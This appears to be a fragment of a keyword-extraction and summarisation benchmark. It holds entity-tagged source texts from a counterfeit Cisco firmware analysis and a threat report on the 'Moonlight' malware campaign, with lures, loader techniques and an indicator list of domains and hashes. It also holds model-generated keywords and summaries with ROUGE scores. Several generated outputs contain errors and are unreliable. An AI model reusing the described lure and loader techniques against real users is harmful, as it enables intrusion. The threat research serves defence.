binwalk for data carving and decompression of relevant sections . While this did not add much insight into the file format , it served as the [ORDINAL] first step to understand what was contained inside . While provisions were present for more complicated arrangements , the contents proved to be very simple : [CARDINAL] one code section and [CARDINAL] one data section . Some trailer data was also included . This contained some textual information possibly related to the build configuration and provided versioning information which we did n\u2019t really need . Appended there , however , was the image signature apparently used to authenticate the image , likely to be [ORG] RSA2048 judging by the size . The signature followed the same format used to authenticate both [PERSON] HBOOT and BROM images . To facilitate future research , a dedicated tool was also developed to unpack and recreate [ORG] MZIP files.12 url | \u00a9 F - Secure LABS35PUBLIC6.3 The [ORG] AMCC file formatData blobs marked with the [ORG] AMCC magic bytes were found in [CARDINAL] at [CARDINAL] least [CARDINAL] two places:\u2022 In the NOR Flash , U8\u2022 In the dedicated EEPROM , U55The [ORG] AMCC ( a reference to [ORG] Applied [ORG] Micro [ORG] Corp ? ) file format was not overly complicated : a fixed - size header followed by fixed - size file entries . The header marked the format with the [ORG] AMCC magic bytes and then specified the entry count at offset [CARDINAL] 8 . It included [CARDINAL] three data elements , one with no known meaning and the other [CARDINAL] two being offsets in the file pointing at structures marked with AENV.Each file entry contained a [ORG] NUL - terminated file name of [CARDINAL] up [CARDINAL] to [CARDINAL] 16 bytes , with data offset at offset [CARDINAL] 16 and size at offset 20.The last 4 bytes of both the header and the file entries was likely to be a CRC32 value for integrity verification purposes . The illustration below highlights the main components of this file format : Figure [CARDINAL] 25 . [ORG] AMCC file with meaningful data elements highlighted . While some unknown data elements remained , it was then easy to extract the files contained within.6.4 [ORG] Software signatures and keysNo public key data was directly identified in BROM or [PERSON] HBOOT , suggesting this data was loaded before control was passed to BROM . So where was this key data stored ? It was possible to make some educated guesses as to where the public key(s ) might be stored:\u2022 In the [ORG] ROM code of SLIMpro\u2022 In some other location related to SLIMpro\u2022 Somewhere on the [ORG] NOR [ORG] FlashThe easiest way to verify this was by browsing through the Flash images in the hope of stumbling upon the keys . During Flash analysis we already identified [CARDINAL] one possible candidate : the [ORG] AMCC data blob at Flash offset [CARDINAL] 0x7DA0800 , with very conspicuous strings ( file names ? ) like ppc.bin.key . This piece of data was the same in all extracted Flash images , suggesting this data to be global for at least any device within the family \u2013 as expected for software signing keys.F-Secure.com | \u00a9 F - Secure LABS36PUBLICFollowing the [ORG] AMCC container format description ( appendix [CARDINAL] 6.3 ) , the files inside could be extracted . This left us with the ppc.bin.key file ( the ppc1.bin.key is identical ) which might have contained software verification keys , but its format was not immediately obvious . However , one could note that there were repeating data pieces such as hex strings [ORG] AB [ORG] 12 [ORG] 34 CD and [ORG] BE [ORG] EF [ORG] CA [ORG] FE at the start and the end , and a text string C2960X in the middle ; all repeated [CARDINAL] 4 times . This could mean there were [CARDINAL] 4 keys contained within this file . Figure [CARDINAL] 26 . The beginning of ppc.bin.key and the BEEFCAFE marker . After spending [TIME] several [TIME] hours on decoding the format of these entries , we were able to provide the following summary : the format loosely followed a tag - length - value ( TLV ) structure with [QUANTITY] 7 - byte fixed header AE 02 25 AB 12 [CARDINAL] 34 CD and [QUANTITY] 4 - byte fixed trailer [ORG] BE [ORG] EF [ORG] CA [ORG] FE , tags were [CARDINAL] one byte , lengths were [CARDINAL] two bytes . Tag 04 was the [ORG] RSA modulus , and tag [CARDINAL] 05 is the [ORG] RSA public exponent ( always 0x10001 , a typical value).Two unique public key moduli were extracted from this file ; they are reproduced below for reference . It is and trailers . Tag 0B was identified to be the [ORG] RSA signature.F-Secure.com | \u00a9 F - Secure LABS37PUBLICPutting this knowledge to work , we could easily confirm whether our deductions were correct with Python : pubmod2pubmod1 > > > > > > \" % 0512x \" % pow(sig , pubexp , pubmod1 ) was incorrect , the decrypted data would appear random . The format appeared to fit what was defined in PKCS#1 v1.513 and the data told us the hash function used was SHA-512.13 url | \u00a9 F - Secure LABS38", "generated_text": "PDF; F-Secure; the Cisco Catalyst 2960-X series; counterfeit Cisco devices; a vulnerability; a security component; the device; authentication security control; the vulnerability; a security component; Secure Boot restrictions; the device; the vulnerability; The authors; this investigation; the F-Secure Hardware Security team; a research project; new techniques; investigation; the hardware; counterfeit devices; stealing data; the theft; the researchers; technical investigation.", "ref_text": "<START-1>The PDF describes an investigation into counterfeit Cisco Catalyst networking devices. The key points are: - Two counterfeit Cisco Catalyst 2960-X switches were obtained for analysis after failing following a software upgrade. The goal was to check for any malicious modifications and understand how they bypassed authentication. - Visual differences in text and component quality were noticed compared to a genuine device. The counterfeit devices lacked a holographic sticker and showed signs of PCB modifications. - Boot process analysis revealed the counterfeits spoofed platform authentication checks, but no persistent backdoors were found in software. - Hardware analysis uncovered the modifications: - Counterfeit A added a circuit board using the I2C bus to exploit a race condition in the SLIMpro boot ROM, bypassing its signature checks. - Counterfeit B replaced the EEPROM with an encrypted chip, comprehensively preventing further analysis. - The SLIMpro bug allowed bypassing the secure boot process, but no backdoors were introduced into its software. - Keys for verifying Cisco software signatures were located in the firmware, allowing validation of this conclusion. In summary, the counterfeits used hardware modifications to bypass authentication checks during boot, but did not appear to introduce persistent software backdoors. The bug exploited represents a previously unknown vulnerability. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.380952380952381, "gpt3/lexical/rouge_rouge2": 0.08383233532934131, "gpt3/lexical/rouge_rougeL": 0.23214285714285718, "gpt3/lexical/rouge_rougeLsum": 0.23214285714285718, "gpt3_generated_text": ["This article discusses the investigation conducted by the F-Secure Hardware Security team on counterfeit Cisco devices, specifically the Cisco Catalyst 2960-X series. The team aimed to verify the presence of any \"backdoor access\" or extra functionality and understand how counterfeit devices bypass authentication security controls. While no backdoors were identified, the team discovered a previously undocumented vulnerability in a security component that allowed the counterfeit device's Secure Boot restrictions to be bypassed. This weakened the device's security posture, potentially allowing attackers to gain persistence and impact the organization's security. The authors acknowledge the collaborative effort of the team and caution readers about the potential inaccuracies in the information presented. The investigation sheds light on the new techniques used in stealing data through counterfeit devices and emphasizes the importance of technical investigation in uncovering vulnerabilities."]}, {"split_name": "test", "sample_id": "test_105", "prompt_text": "Extract the keywords: CompanyEnglishLEADERSHIPINVESTORSPRESS RELEASESMEDIA COVERAGEEVENTSBLOGAWARDSCAREERSCONTACT USCyber security information center [WORK_OF_ART] Moonlight [WORK_OF_ART] \u2013 [WORK_OF_ART] Targeted attacks in [LOC] the [LOC] Middle [LOC] EastPosted by [PERSON] Chris [PERSON] Doman on [DATE] Oct 26 , [DATE] 2016 1:30:00 [ORG] AMFind me on : Tweet Share185Vectra Threat Labs researchers have uncovered the activities of a group of individuals currently engaged in targeted attacks against entities in [LOC] the [LOC] Middle [LOC] East . We identi\ufb01ed [CARDINAL] over [CARDINAL] 200 samples of malware generated by the group over [DATE] the [DATE] last [DATE] two [DATE] years . These   attacks are themed around Middle Eastern political issues and the motivation appears to relate to espionage , as opposed to opportunistic or criminal intentions . These are not technically sophisticated attackers . However , they do deploy some novel tactics , detailed below , and the implications of these attacks could be signi\ufb01cant . Both the tools and targets of [PERSON] Moonlight are reminiscent of \u201c Gaza Hacker Team , \u201d a group of   attackers that are said to be politically aligned to the Hamas[1 ] . In spite of these commonalities , we have not identi\ufb01ed any \ufb01rm links    between the [CARDINAL] two groups . We refer to this group of attackers as [PERSON] Moonlight , after the name the attackers chose for [CARDINAL] one of their command - and - control domains.[1 ] url \u2019s targetsVectra [GPE] Networks worked with providers to sinkhole [ORG] Moonlight \u2019s command - and - control infrastructure . The hosts seen via our sinkhole show a clear targeting of [NORP] Middle [NORP] Eastern victims : Figure [CARDINAL] 1 : [ORG] Moonlight \u2019s victims of attacks Most of these victims are connecting from home networks , and are therefore unidenti\ufb01able , though one notable victim is a   [NORP] Palestinian news organization . Vectra believe the victims from [GPE] the [GPE] United [GPE] States and [GPE] China are outliers . These infected machines were primarily from university networks and were likely either security researchers sandboxing malware or overseas students targeted for links to their homeland . Indirect targeting data from to the online virus scanning site [ORG] VirusTotal , and traf\ufb01c statistics from the URL linking services the   attackers use indicate many of these attacks are targeted towards either small groups or individual targets : Figure [CARDINAL] 2 : The statistics show [CARDINAL] one of the attacker \u2019s malicious \ufb01les , registering [CARDINAL] only [CARDINAL] two clicks OpenMe.docx.exeThe attackers name their malware as documents of interest to their victims , to entice them to open them . The malicious decoy documents display themes relevant to [NORP] Middle [NORP] Eastern politics , and provide some indication as to who the intended targets may be:20160611 [ORG] - NCRI [ORG] - AR [ORG] - Rajavi [ORG] - [ORG] Syria [ORG] - Ramadan.docx.exe [ORG] Assassination [ORG] of [ORG] Talal of [GPE] Jordan YouTube.exe Audio recording of the meeting of [NORP] Egyptian Emirati . MP3.exe Brigadier [PERSON] Alleno behind moral projection of Zakaria al-Agha.docx.exe exe [ORG] Fatah foreign conspiracies.exe Wapons and ammunition stores found while digging a waterway in [NORP] Egyptian [PERSON] Rafah.exe [PERSON] Hamas and [ORG] Fatah agree to the following.exe [ORG] Hamas and the [NORP] Egyptian army.exe [ORG] Hamas and the [PERSON] Sala\ufb01st jihadist in the [GPE] Gaza Strip.scr   [ORG] Hamas [ORG] Betrayal.exe [ORG] Important leaking security meeting [ORG] Arab [ORG] Emirates.exe scr [ORG] Leaked audio recording of the meeting of [NORP] Egyptian security Emirates.mp3.exe Leaking important [ORG] Arab [ORG] Emirates security meeting.mp3.exe Meeting of [ORG] the [ORG] Executive [ORG] Committee of the PLO.exe President sources oust [ORG] Fatah leadership in [GPE] Gaza and the cost [PERSON] Abu [PERSON] Samhadana to lead the organization.doc.exe [PERSON] Sawiris and the project of [LOC] the [LOC] Suez [LOC] Canal.exe [LOC] Sinai Bombings.docx.exe The full truth behind [PERSON] Abu [PERSON] Ghussains disease.exe The grandson of President [PERSON] Abbas in the festival of love , and what response was Mr. [PERSON] Samir [PERSON] Mashharawi him.exe The names of the perpetrators of the bombings in [GPE] the [GPE] Gaza [GPE] Strip.exe The son of [ORG] Mufti tak\ufb01ri [ORG] Hamas \ufb01st anti - drug police.docx.exe   Moonlight demonstrates that 0 [DATE] - days , or even exploits , are n\u2019t required to successfully compromise machines . Instead , they show a preference for the classic social engineering approach of sending e - mails with attachments or links to \ufb01les with the \ufb01lename    [ legitimate \ufb01le - extension].exe , for example : scr Secrets documents Panama.docx.exe doc.exe [PERSON] Audio recording of the meeting of [NORP] Egyptian Emirati.mp3.exeMoonlight typically makes good on the promised theme of the lures , and present the victim with a relevant \u201c decoy document\u201d:Figure [CARDINAL] 3 : \" [WORK_OF_ART] Meeting [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Executive [WORK_OF_ART] Committee [WORK_OF_ART] of [WORK_OF_ART] the PLO \" [WORK_OF_ART] - [WORK_OF_ART] Decoy documents opened on victim machines by the malwareFigure [CARDINAL] 4 : Decoy video about women traf\ufb01cked to [GPE] Syria   Impersonated new organizationsThe attackers typically deploy malicious \ufb01les via shortened URLs , presumably to look more innocuous . Many of the links and   domains impersonate [NORP] Middle [NORP] Eastern media organizations such as [ORG] Eln [ORG] News and Wattan TV : url url url domain impersonating the media , Alwatenvoice[.]com , also hosts \u201c landing pages \u201d to encourage victims to download the malware , described below . DistributionOne Facebook user has shared a number of posts from the malicious Alwatenvoice[.]com : Figure [CARDINAL] 5 : [CARDINAL] Two pages containing malware shared by the user on Facebook The [ORDINAL] second post is of particular interest . The [PRODUCT] Facebook information box says the article is from [ORG] All4Syria[.]info , a popular independent news outlet reporting on [GPE] Syria , but in fact it leads to Alwatenvoice[.]com : Figure [CARDINAL] 6 : The link to [ORG] All4Syria[.]info that actually leads to Alwatenvoice[.]com The user is then presented with a page that looks very much like the real [PERSON] All4Syria website : \u0627(cid:2)(cid:8)(cid:9)(cid:10)\u0631\u0629\u0627(cid:2)(cid:3)(cid:4)\u0631(cid:6)(cid:7)Figure [CARDINAL] 7 : The malicious page on Alwatenvoice[.]com on the left , and the legitimate site All4Syria[.]nfo on the right If a user clicks \u201c play , \u201d they are asked to download malware named The pro\ufb01le posting these malicious links has a very small number of public posts . The \ufb01rst post from [DATE] 2015 shows the user setting    their wallpaper to the logo of [ORG] Fatah . There are [CARDINAL] two celebrations of Facebook friendship displayed publicly , [CARDINAL] one of whom can be identi\ufb01ed from the name and Facebook pro\ufb01le information . Their details match that of a senior [ORG] Fatah militant who [ORG] Reuters reported    was targeted for assassination during violent struggles between [ORG] Hamas in [ORG] Fatah in [DATE] 2007 . We would stress that even if the account is controlled by the attackers it could be an account that they have compromised , or impersonates an innocent and unconnected person . It is also possible that the account sharing the malicious links belongs to a user who is unknowingly spreading malicious content [PERSON] mp4.exe ( \u201c [WORK_OF_ART] Syrian [WORK_OF_ART] Prostitution Rings.mp4.exe\u201d).(cid:12)(cid:13)(cid:14)(cid:10)\u062aH [WORK_OF_ART] - WormMoonlight typically delivers an obfuscated version of the widely available H - Worm[2 ] , a malicious [PERSON] Visual [PERSON] Basic [PERSON] Script worm , as their \ufb01rst stage backdoor . Moonlight deploy an ever - changing range of deployment scripts to evade anti - virus software . Many of these   use basic scripts within self - extracting [ORG] RAR archives to install the malware:[2 ] url\ufb01reeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html Figure [CARDINAL] 8 : Some of the malicious scripts used by Moonlight to deploy H [ORG] - Worm In these excerpts , we see the Moonlight make some strange choices in deploying their malware such as : Opening a decoy document from the [PRODUCT] Windows [PRODUCT] System folder Preventing users from deleting any \ufb01les ( including the installed malware ) from the   [ORG] C:\\temp\\ folderThere is a large amount of variation in the scripts used to install malware , and it \u2019s likely that the large number of samples have been produced by hand , rather than a more productionised process of using build tools that is preferred by more sophisticated groups.njRatRecords to URLs that users have submitted to [ORG] VirusTotal record the attackers installing additional malware using the access they gained with the \ufb01rst stage H [ORG] - Worm malware . Examples of this are recorded in URLs submitted to [ORG] VirusTotal [ [CARDINAL] 3 ] for the domain fun2[.]dynu.com : DateLocation2016 - 05 - 24C:/Users / Administrator / Desktop / service.exe2016 - 05 [CARDINAL] - 31C:/Users / Administrator / Desktop / WindowsService1.exe2016 - 08 - 10C:/users / administrator / desktop / k.exe2016 - 08 - 10C:/users / administrator / desktop / service.exe[3 ] url with earlier stages , the attackers employ a number of methods to deploy the well - known[4 ] njRat which seems to vary from sample to sample . In [CARDINAL] one example the malware stores a program within a base64 compressed blob . This is then loaded into memory , and executed using [ORG] EntryPoint . Invoke():Figure [CARDINAL] 9 : An example loader for njRat deployed by [CARDINAL] Moonlight[4 ] url and url\ufb01les / fta-1009 - --njrat - uncovered.pdf The [CARDINAL] 24 Kb of code this decodes to is another .NET application \u2013 njRat . Other droppers also decrypt the blob , before it is executed . Both njRat and code obfuscators such as this are freely available[5 ] , and there are a plethora of tutorials available online to help budding hackers use them with limited technical knowledge.[5 ] Eg ; url signi\ufb01cant operation [ORG] Moonlight \u2019s command - and - control infrastructure is very simple . It consists of dynamic domains controlled via home internet connections in [GPE] the [GPE] West [GPE] Bank [GPE] of [GPE] Palestine . We were surprised to identify a very large number of varied malware samples ( over [CARDINAL] 200 ) attached to this simple infrastructure : Figure [CARDINAL] 10 : Moonlight \u2019s infrastructureAttacker evolutionThe earliest attacks appear to be non - targeted , opportunistically inviting victims to click links on [GPE] Youtube videos and social media posts typical of [LOC] Middle [LOC] - [LOC] Eastern \u201c hacktivists . \u201d Later attacks appear to target particular groups or individuals . Moonlight \u2019s usage of the Google URL shortening service allows us to roughly compare attacks over time : Figure [CARDINAL] 11 : [CARDINAL] One attack from [DATE] December [DATE] 2014 ( left ) , and [CARDINAL] one from [DATE] December [DATE] 2015 ( right)Who are the attackers?In general , the assigned [ORG] IP - location of command and control servers is a poor indication[6 ] of attacker locations . However , in this case the provided locations of home networks in the [GPE] Gaza strip are likely to be accurate and \ufb01ts with other details from the attacks .   The attackers also demonstrate low operational security , particularly in their earlier attacks . Domain Whois records and social media posts provide strong ideas as to the identities of some of those involved . It would not be prudent to publish the identities of the possible attackers in a con\ufb02ict zone .   Perhaps a more interesting question is \" What are the attackers \u2019 aims ? \" Or if they are being directed , who is ultimately funding and tasking them?[6 ] With reference to url and url attacksAttacks such as these are often overlooked due to their low technical sophistication . But the stakes of these attacks are high , even if the attacker skill level is low . If the motivation behind these attacks is indeed political , the consequences could mean loss of life . Violence between rival political factions in [GPE] Palestine has resulted in the deaths of [CARDINAL] hundreds of people . Individuals and organizations outside of [LOC] the [LOC] Middle [LOC] East are unlikely to encounter the attacks by [PERSON] Moonlight . However , the tools and techniques deployed are typical of low - skilled but determined attackers within [LOC] the [LOC] Middle [LOC] East and serve as an example of the kinds of attacks that often slip through . Moonlight \u2019s strategy of obfuscating well known malware appears to be fairly successful at evading host - based security mechanisms . The network communications of the well - known malware families such as H [ORG] - Worm and njRat should still trigger existing network signature base detection tools . [ORG] Vectra customers are protected through the following generic detections : Suspicious HTTP \u2013 Provides generic detection of HTTP based malware such as H [ORG] - Worm [ORG] External [ORG] Remote [ORG] Access \u2013 Provides generic detection of RATs such as njRatMalware Update \u2013 Provides generic detection of [ORDINAL] secondary malware over HTTP(S)Security professionals can review the Appendix for a full listing of \ufb01le - hashes and domains employed in these attackers .   [ORG] Vectra [ORG] Threat [ORG] Labs operates at the precise intersection of security research and data science . We take unexplained phenomena seen in customer networks and dig deeper to \ufb01nd the underlying reasons for the observed behavior . Click   here to read more of our reasearch . [ORG] AppendixDomains Any traf\ufb01c to the following domains on your network should be investigated . Please note that many of these domains have been   sinkholed by [ORG] Vectra . alwatenvoice[.]com elnnews - [ORG] com.duckdns[.]org fun1.dynu[.]com fun2.dynu[.]com fun3.dynu[.]com fun4.dynu[.]com fun5.dynu[.]com h.safeteamdyndns[.]se h0tmail.duckdns[.]org hackteam1.spdns[.]de hema200.publicvm[.]com hema200.safeteamdyndns[.]se hema2000.dynu[.]com hp200.spdns[.]eu hp500.linkpc[.]net hp600.spdns[.]eu moonlights.linkpc[.]net new4.spdns[.]eu opstin.spdns[.]eu run500.linkpc[.]net run900.linkpc[.]net wattan24.duckdns[.]org aman - news[.]com MD5 HashesABD8F478FAF299F8684A517DCB1DF997 003F460F6EA6B446F31AA4DC57F3B027 568218BB07C021BBAB3B6D6560D7208CAC19A1E5D604D82EF81E35756F3A10D1 0392F8BE82A297242BAAD10A9A2912EB 573138482B185F493B49D3966650CDADAC3918287452FEBD3855FF4BC3D82A0704A4CC757B4D283FF8DE246C19E8D230 5947BBAD60D4D00EF545E2FB3B1FD03EAC89E42EE593CEA80030820618F2BCF604B2D3F38055B2B821B30E82C44D604059E18D4ED3C97279DB16984C07213EB1ACAB47BB5E8ED34056905FF63353CABC 0512F533BF2E8E5EC9637B804C101C2B 5BF5BE6B45292FBA0C0EDC415F248922ACCF82FC29467C08CE087072FEA3D14A 05618077C03B80ACE066B9851966FBB15CC9964DD41BE3D9DACBD0425EC032A9ACD58BB34BB275DE1570917624ADE609 0606FEE55F39784E9889C1AAA0F278825CFD542A561F1EE679FCD6AA81991F3AAE238D1E52CD4A9DECFE769FE5844747 064F0A5FCC869F6EB77405D3FE98AF87 5E59ACF240E2881B1C1E2F5586C9CA6FAE9E9E3C73483E8B6C6E58E5629DC4D0 07EB24224A722EA9D8A3DC610B834D7A [CARDINAL] 5F0437C7DC45D4C10A045954DB77DD31B053BBB499D68CCE1782B33FDE7B43FF 0975222DE39433A25E672595B1960CDB [CARDINAL] 61381610E76266423ACE96670DE45DC0B0B9332082E98D51CB7265A45A945A220A38DDCC3431BAE448E38C99562162EF 6212E9A07225D6B71769D2BBBC20CD04B184FA51604D7EAA5A45350D1E08E5B70A49531FC0C00E991E51F34398F3AB886218A61D18F5A74F82ABC31A5F073C4BB3FB8253595FED348464B5C9A01AD4AD 0ABBD2765B563F2B8748485FA84DA07062C0B9EA3638BEF977A7D33970E52E38B532676D6A5A6684B62A078BFBCBBD0B 0AED206FC534C310724E122BF6BCDF7F 63D933310CFB26EC9913A26BEF230A99B77A14A594A59C3B86EDD940FB35AB5E 0B2023BC4ADFBB8157DA9147B9FAFACB [CARDINAL] 64ACAFF36681B16C5717741E17DCB329B82DE5F1C26143083D988B06F6C927C30B40D67579AF550C0A3AEE359C2C71BA 64AF25B42E21F01A213C32CC66CFD749B841E134EC7FE48095754742C8A2B8D70BD3B5C667878830DA088527D1B753EC [CARDINAL] 655F56F880655198962CA8DD746431E8B929FC62DB2B3C8CC6A03063767BE125 0C15603B17FA333189AB5ED06E0993F7696232159428BCB2BDA5AC2C755E8FEDBB15E754AE3B85A12447B448F6F7E43E 0CA048153AC96E5C41243B364092AF0769A042C9ED90A30444606407F77E199FBBF576CF704B71C739E8777EB6C9FF820D67422BA42D4A548E807B0298E372C76C4B69C19F2C3AC23AC392B8631E31BBBD2234DAE56580AAA7F880A7DB0F397D 0E9B363DE7DD2B10AFD5D1947FA0E006 6C4D355411B8D7DA56A2C7C14693A3AEBE23B3AFD1FD32C900F012CB2A8BA755 [CARDINAL] 0F83377C44ADBA238FD0F0EB241981A6 6D418227FEB7A60727326583B52187E6C28376FC9EE627B51E3F52503397E2DC [CARDINAL] 114B805F977E17558DD89E8029E29DF06E2E488CDDF1D15D0411F3838ED04683C291CFAC28F323F9808D633A8558A35A 118A606FB131C082B55A5625661B666A6EE7264D4A974D0FFFED7F39652D1DADC64052167D6A183A3ECC259EE0F3A0C6 129F4B0A1F209784BF7071C14119BF9F71B00CBD186B1C168FD207B8F43FC8E0C8D912CF5BF526E551972EBB5454DD3F 1325AB5DCA14B58A8A7B9A8F5A1EE4DC 72076B1B2D9CB0507E5C94C2B422CCE7C92E26AC3145718E531330B87772D21613AF6A3C3A3908FD4E606A1F19B0571472BEA803A834F7736679781A1D729B1FCB539DFAEECC4BAF875A1E431701FF9D 148A3E3CC76CF6753B15070FE3514DAE 7681AE3933F3E13EB8E2A9BE281A5763CC9FAEC3F39EDAF7A59E9D9A7577451C 14C1E03DE25811C3D6D467837A16BB29 76A68FE73FFF571F257A1B0F100ACA1DCCFA1B31C47C9F124FEFE206301B3A5F 15F7682A178F789EDB40CEAABA9E5103 77D02BE92D052F35604CAA9885DD9A77CD10D61A0D2D43A6AB16A9F50B1AD894 1673583BC5B7A485119D4A1342D6ADA8 [CARDINAL] 7840F2473B3A0E0960A1925F3CD0C3B1CF51142459F7B40E751E91179C00129917D70C318C6D16EA599E39550C44FA7F 7A4588DC14AE38505662B75DA93CA8A7CFE26B57E168B6C6A18C668E36A3E939 1856F46DA93C3B152C358E0F6DB53402 [CARDINAL] 7AEFB825277764CD9F31BC1F2370D18DD179427D46D38D78A7A60512A45954961966F3B1D4ADEC25AB866C4E061A1E50 7C14974DD39B071558C619D16C4216DBD24B6317064DA37D31CE4459AC7F4B69 1C4AB6CF907175D114C48C30A38BF379 7D1F1FED52745D36D737EFA7D43F4B95D297E0DB6D63A952B08B6F0E3FE101E7 1D693473FF431C7CEA3E7AB0130EAA3D 7D27548E3F56FA532C571FB409ECD7B6D3C8ECF591381B31D3AA796471B5B0F1 [CARDINAL] 1F644DE33D57C12A393B12F92A7C44C5 7DD199B0C678EF409A7DC461DE850849D5DFF6DB76B75D346D3B33BBA5B7CBFA 215556AF1A5FEF7E08A6124D94487D2F [CARDINAL] 7ED4897B11798F4639C73D57F901A661D5EEE8DC2507D46E1DC11F7B7441F506 21CE82DB335964B8624F8EB0668B539F 833B3AF9BD8FFD0390BCA1D43EE78CC3D817FD5A442C7668607AE895D429804022CC7CE1E17852B6D09D5641B6ABCA0D 83AD97BF1D5A9044AAFBA6AAC4B7387ED9EACFF28841C51ACE9712AF78BCBDD0 [CARDINAL] 24D2CE38D2886A00E678E8C23AD8D1CA 841C3AFAA8CAF0AC33BF783D5FEAEADBDD2D6B625E7ADD1528311A0CF5FD5EAE 276E54A5E32BEF12367C5B31BF9C179E 8492C3111C7C0998F0DC1B63967E5C65DDD73E73BE2CC934D5721D4FC62CD98C 27A1891DB06D316B43A48DDEFEBF73BF 853A53CF799E2E3E1FC244A0751A4E96DDEEE52C00A95167353215D14B3AAA68 2851685F217EB1CE573FC2BAE79188018799B3D6B2CE50D4DD5F5114635A4B96DE2E753D12CE07F7B3F97C498D3477F8 28FBFD2AD1B500B62377DDE5795CDF85 87E5555CFF74D41551D6D29B9C01C0CBDF38B1562E4F0B735B3E10BAE78DF2A9 [CARDINAL] 2930596D4E1328B79C349455E71EE1B08943A561F0839D43B8BD476357992540E1B56D70FA5397509F901ED72724A5E929771C26BFDD125E7427CD57A98730FF [CARDINAL] 897061CD7F0BBAE1B024ED9C1C1998A1E3E2CD771C8183464737233D17CD6A092993B77D82622D665F9B2F06C89741BE 8A2E5662ED22D0D555E6B90FE5E1C902E42CD849370F2BE67F40B97B5D741B372A0F5D8C5BC021A1CEFED7442B02DF52 8AD4C22449B98339548D38BF87BF50AAE613FBAAF0E64B1CA740F9859D5CAF0B 2AB91CEDD813E306248E545075C60866 8BE6FBAD0618D6A398966AF3D20F5418E61732ADD06F5EB98FE6AD42CE9682F6 2C8C94E85EF8C757586590E8D1ABDC6C [CARDINAL] 8F8E5A9553A27A9341ED6022028B231DE8909F06EF95B222121B72E12DB2111D2CBD8E0EB9DF67E7D304F28803D4529E 8FDD4BA7920B3D6AB2F0106FDF4ED702E8C4A336C901A8799525EA30486838B32DC30F736F1A485DBBEED63EC9259726 8FF5EF99FAF5E17B7D5B46585BAC7B43EA788C263E04B93D36E0D82BB7D1BC05 2E49F5BD50A4E82DB05B4E42F18536F3 90C49D0CEF0DFCFF3C09723A9918688DEB7B7C974A66E7F9A0EAD3113F949EC8 2F352CD6486C518DDC61B7EBBEAB5F01 927DBA3C9B98FD749017E3DEE270136BECB97F19AB0568CD0536567A7DEF44FF 348D6C08F155F0781574C34E573B6F1F940A1B2C537FA2F764283795E9B665BAEF53161673CA4CAA7E9C4B33A0D02A90 36E3307F26E5B8BDBA30D7EA7CA62CD8 [CARDINAL] 968EF6CB0DFB082DF7A68C3B8869C57BEFCA552B3CA4B8FF8686FD313FF2D48E 37CB0DF3AF8D3CA2086EEDAF3479D21C 974037C602A559C471BBDA3D07F50650EFE54DF820FA8434CF14A5A8F55F52B739581B22FB078851D6DAA492C4F5BE97 97AA47094205DF17C15ED216227C4DA8F007B759A30EDF46FD921E2D87A39D5D 3CE01AD1B116943F5FB1B2925C5DCAF1 99215ADB3D924F52D69BEAB6981791EBF17CD2526A0E46D806863E1320A2CF5B 3D2E266B9FDAD45AEF7D83164BEB7A37 992D434A726B9C50851B809FB95C169BF33B62D496F58E752BB190296781CFF93EAA4C1C6716133612CBA0EA4A6905B5 9A9D01BCB93EF99E1B8EBF727D72E91FF48AAB23D1DEF618449D70514615396640E9ED913857D5196368A64D9972FCB89EF41A195932EDE4E9E6800E7D272A2EF59453D2FF8F29617DB23201C568017C4484EB027D30C4705717CDE931245827 A12EB4CD0CAD629FCE59AE5120B82133F7CF132313438115B0BBED035078FB1C 476764A1E6E121CF59C7F101F0E14968A1E60D076CC9488EB7D86BD70FF70154F8AD6A207BEE8C042220CC52AF2DAC29 4791667A4935718C4A55FA23EB18A520A2E82ED55692BF64B819117C48F13F62F8FF494B1C0403C3C99C6D67BEF7069A [CARDINAL] 48A8E95E79787EB27465AAD52855788A A3296E4D931583415C2B1B7A68C96508F93A95668040E143F19F94210CA18D884C325C62D2CD9A69AA2CCF920A61B4C1 A3DFD16AC5E2E0343E61E19C13FCFF2BFA428FEF017B496DCAE6428889114FCC 4E3925ABF0CB66CE4476DFFC41131396 A62DE1A146EEC778344600F8EEE86DA9FA8C119B3F0B1F9C2AA9F5D8908C95364EB6B5F6E3CB72869F29D567AC888C05 [PERSON] A7BF176D5BD80C2AD3815EC41E9BA6E6FBB0BA6E2E570CA1B4F495F3040B6F6D 50B1E6E24A1DB4D68A2D51BD7115BAA3 A7F58A9D83CA22846282994A0393FB82FE71389ACD3EE1B42A0895668C73DC21 [CARDINAL] 517822AF63D640DFE8C6590B36AD8F80 A803F9914141F2CA72EB0C2162E2BA36FE742125449AFABB37B21844171FBC9951817D6FA9F1BA398176ABE63230568A A866F515362066AEA4BBEF0B6C1BDB13FF295CF738DE580E2EE41D0100C848AE 53BADCB66F848805E781716F95CF10AB AA45A3DFD4E7329DF37D8C74F0DA01B4FFE598B9C3DE334571881035D478ABE4AA4774F70E080AB0A33C6B8F83C70589Topics : [ORG] Targeted [ORG] Attacks , [PERSON] Malware [PERSON] Attacks , cyber security , [PERSON] Threat [PERSON] Labs [PERSON] Subscribe to the Vectra BlogRecent PostsMoonlight \u2013 Targeted attacks in [LOC] the [LOC] Middle [LOC] East [LOC] Triggering MS16 - 030 via targeted fuzzing Exploiting the \ufb01rewall beachhead : A history of backdoors into critical infrastructure   Bringing attack detection to the data center Reverse engineering the Shadow Brokers dump : A close look at [NORP] NOPENPosts by [PERSON] Topic [PERSON] Cyberattacks ( [CARDINAL] 19 ) [PERSON] Malware [PERSON] Attacks ( [CARDINAL] 15 ) Insider Threats ( [CARDINAL] 13 ) cybersecurity ( 12 [WORK_OF_ART] ) [WORK_OF_ART] Targeted [WORK_OF_ART] Attacks ( 12)see all Follow usGet security that thinks . See it think for you . REQUEST A DEMOAbout UsWhy Vectra PrivacyTerms of Use", "generated_text": "Moonlight; individuals; malware; organizations; the Middle East; 2016; the attacks; Middle Eastern political issues; the motivation; espionage; opportunistic; criminal intent; a group; Gaza Hacker Team; the Hamas; a group; links; the attackers; the tools; targets; scams; Port; the malware; documents; themes; Middle Eastern politics; the malware; victims; Microsoft Office; command; control; servers; a sinkhole; infrastructure; tools; target; victims; phishing emails; malware samples; the campaign; attribution; the attackers; MalwareTotal; a group; access; threat actors; the Middle East.", "ref_text": "<START-1>The document describes targeted cyberattacks against entities in the Middle East by a group referred to as \"Moonlight.\" The attacks appear politically motivated for espionage rather than financial gain. The attacks target victims in the Middle East, primarily connecting from home networks. One notable victim is a Palestinian news organization. The attackers use social engineering tactics, sending emails 